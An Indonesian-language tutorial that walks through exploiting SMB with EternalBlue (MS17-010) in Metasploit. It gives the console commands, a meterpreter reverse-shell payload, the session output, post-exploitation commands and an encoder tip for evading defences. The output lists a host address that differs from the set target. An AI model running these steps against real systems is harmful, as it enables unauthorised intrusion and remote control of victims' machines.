# Menjalankan Eksploitasi dengan Metasploit Framework

## A. Apa Itu Eksploitasi?

Eksploitasi adalah proses menyerang dan memanfaatkan kerentanan pada sistem target untuk mendapatkan akses tidak sah, baik melalui `shell`, `akses file`, atau `kontrol penuh`.

Dalam Metasploit Framework, eksploitasi dijalankan melalui modul `exploit` + `payload`, misalnya:
- **Exploit**: `exploit/windows/smb/ms17_010_eternalblue`
- **Payload**: `windows/meterpreter/reverse_tcp`

## B. Proses Dasar Eksploitasi

Langkah-langkah umum untuk menjalankan eksploitasi di Metasploit Framework:
1. Pilih dan muat modul exploit
2. Tentukan target (`RHOST`, `RPORT`)
3. Pilih payload
4. Konfigurasi payload (`LHOST`, `LPORT`, `dll`)
5. Jalankan exploit
6. Kelola sesi yang terbuka (jika berhasil)

## C. Contoh: Eksploitasi SMB dengan EternalBlue (MS17-010)

1. Jalankan Metasploit:

   ```
   msfconsole
   ```

   Tunggu sampai muncul prompt seperti ini:

   ```
   msf6 >
   ```

2. Cari Exploit yang Sesuai:

   ```
   search eternalblue
   ```

   Contoh hasil:

   ```
   exploit/windows/smb/ms17_010_eternalblue
   ```

3. Gunakan Exploit:

   ```
   use exploit/windows/smb/ms17_010_eternalblue
   ```

4. Lihat Opsi Konfigurasi:

   ```
   show options
   ```

   Hasil output-nya seperti ini:

   ```
   msf6 exploit(windows/smb/ms17_010_eternalblue) > options 

   Module options (exploit/windows/smb/ms17_010_eternalblue):

      Name           Current Setting  Required  Description
      ----           ---------------  --------  -----------
      RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
      RPORT          445              yes       The target port (TCP)
      SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
      SMBPass                         no        (Optional) The password for the specified username
      SMBUser                         no        (Optional) The username to authenticate as
      VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
      VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


   Payload options (windows/x64/meterpreter/reverse_tcp):

      Name      Current Setting  Required  Description
      ----      ---------------  --------  -----------
      EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
      LHOST     192.168.1.42     yes       The listen address (an interface may be specified)
      LPORT     4444             yes       The listen port


   Exploit target:

      Id  Name
      --  ----
      1   Windows 7



   View the full module info with the info, or info -d command.
   ```
   
6. Setting Target dan Payload:

   ```
   set RHOSTS 192.168.1.10
   set RPORT 445
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.1.5
   set LPORT 4444
   ```

7. Jalankan Exploit:

   ```
   exploit
   ```

   Kalu berhasil output-nya akan sepertin ini:

   ```
   [*] Sending stage (203846 bytes) to 192.168.1.10
   [+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   [+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   [+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   [*] Meterpreter session 2 opened (192.168.1.5:4444 -> 192.168.1.10:49158) at 2025-05-07 20:27:03 +0700

   meterpreter > 
   ```

   Setelah berhasil mendapatkan sesi Meterpreter, kamu bisa melakukan beberapa hal diantaranya:

   1. Melihat informasi sistem target:

      ```
      sysinfo
      ```

   2. Menampilkan User ID (UID):

      ```
      getuid
      ```

   3. Membuka command shell (cmd.exe) dari mesin korban:

      ```
      shell 
      ```

## D. Troubleshooting Umum

| Masalah | Solusi |
|:--:|:--:|
| Tidak ada sesi yang terbuka	| Cek firewall, antivirus, atau salah setting `RHOST`/`LHOST` |
| Payload tidak terkirim | Gunakan encoder atau coba port lain |
| exploit stuck | Gunakan `set VERBOSE true` untuk debug |

## E. Kesimpulan

Eksploitasi di Metasploit Framework memerlukan:
1. Pemahaman modul dan payload
2. Konfigurasi parameter yang akurat
3. Kesabaran dan analisa ketika exploit gagal

> Dengan latihan dan memahami pola kerja eksploitasi, kamu bisa mengeksekusi serangan yang lebih kompleks dan efisien.
